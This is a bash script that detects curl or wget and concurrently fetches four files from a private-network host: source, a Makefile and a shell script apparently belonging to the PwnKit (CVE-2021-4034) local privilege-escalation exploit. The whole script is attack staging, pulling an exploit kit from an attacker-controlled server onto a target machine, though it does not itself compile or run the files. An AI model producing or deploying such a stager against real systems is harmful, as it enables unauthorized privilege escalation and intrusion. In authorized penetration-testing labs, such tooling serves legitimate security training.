#!/bin/bash

# URLs of the files to be downloaded
url1="http://192.168.119.145/cve-2021-4034.c"
url2="http://192.168.119.145/pwnkit.c"
url3="http://192.168.119.145/Makefile"
url4="http://192.168.119.145/cve-2021-4034.sh"


# Function to download files using curl
download_curl() {
    curl -O "$1" &
}

# Function to download files using wget
download_wget() {
    wget "$1" &
}

# Check which downloader (curl or wget) is available
if command -v curl >/dev/null; then
    downloader="curl"
elif command -v wget >/dev/null; then
    downloader="wget"
else
    echo "Neither curl nor wget is available. Please install one of them and try again."
    exit 1
fi

# Download files concurrently based on the available downloader
if [[ "$downloader" == "curl" ]]; then
    download_curl "$url1"
    download_curl "$url2"
    download_curl "$url3"
    download_curl "$url4"
elif [[ "$downloader" == "wget" ]]; then
    download_wget "$url1"
    download_wget "$url2"
    download_wget "$url3"
    download_wget "$url4"
fi

# Wait for all background processes (downloads) to finish
wait

# Print a message when all downloads are complete
echo "All downloads completed using $downloader."
